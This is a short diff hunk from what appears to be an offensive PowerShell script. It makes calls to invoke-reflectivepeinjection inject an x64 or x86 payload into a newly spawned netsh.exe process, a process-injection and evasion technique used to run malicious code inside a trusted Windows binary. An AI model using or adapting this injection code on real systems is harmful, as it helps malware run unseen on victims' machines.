@@ -476,9 +476,9 @@ if (($p = Get-Process | ? {$_.id -eq $pid}).name -eq "powershell") {
     $t=$true
 }
 if ($t -and [IntPtr]::size -eq 8){
-    invoke-reflectivepeinjection -payload x64
+    invoke-reflectivepeinjection -payload x64 -NewProcess c:\windows\system32\netsh.exe
 } 
 elseif (($t -and [IntPtr]::size -eq 4)) {
-    invoke-reflectivepeinjection -payload x86
+    invoke-reflectivepeinjection -payload x86 -NewProcess c:\windows\system32\netsh.exe
 }
 }
